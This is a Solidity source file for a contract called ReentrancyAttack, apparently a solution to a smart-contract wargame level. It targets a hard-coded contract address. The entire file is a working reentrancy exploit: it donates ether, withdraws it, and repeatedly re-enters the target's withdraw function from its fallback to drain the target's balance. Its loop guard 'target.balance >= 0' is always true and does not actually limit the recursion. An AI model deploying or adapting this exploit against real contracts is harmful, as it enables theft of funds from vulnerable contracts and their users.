// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReentrance {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract ReentrancyAttack {

    address target = 0x2E7462F2E74b6bFf17B7C2f5AA0Ba40A6a439e98;
    uint256 amountToWithdraw;

    constructor() payable {
        amountToWithdraw = msg.value;
    }

    function attack() external payable {
        IReentrance(target).donate{value : amountToWithdraw}(address(this));
        IReentrance(target).withdraw(amountToWithdraw);
    }

    fallback() external payable {
        if (target.balance >= 0) {
            IReentrance(target).withdraw(amountToWithdraw);
        }
    }
}